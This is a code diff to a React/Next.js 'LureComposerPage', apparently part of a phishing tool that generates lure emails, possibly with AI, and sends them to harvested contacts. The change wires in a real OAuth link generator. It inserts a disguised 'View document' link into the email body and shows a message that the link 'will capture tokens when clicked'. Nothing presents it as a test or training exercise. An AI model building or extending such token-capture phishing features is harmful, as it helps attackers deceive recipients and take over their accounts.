@@ -4,7 +4,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { motion } from "framer-motion";
 import { useParams, useRouter } from "next/navigation";
 import { Token } from "@/types/token";
-import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck } from "@/lib/api";
+import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck, generateOAuthLink } from "@/lib/api";
 import { fileToBase64 } from "@/lib/utils";
 import {
   Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
@@ -344,9 +344,15 @@ export default function LureComposerPage() {
     });
   };
 
-  const insertOAuthLink = () => {
-    const link = "[OAUTH_LINK_PLACEHOLDER]";
-    setBody((prev) => prev + `\n\n<a href="${link}">View document</a>`);
+  const insertOAuthLink = async () => {
+    try {
+      const res = await generateOAuthLink(false);
+      const link = res.link;
+      setBody((prev) => prev + `\n\n<a href="${link}">View document</a>`);
+      toast.success("OAuth capture link inserted", { description: "Link will capture tokens when clicked" });
+    } catch (err: any) {
+      toast.error("Failed to generate OAuth link", { description: err.message });
+    }
   };
 
   const handleGenerateAI = async (templateType: string) => {
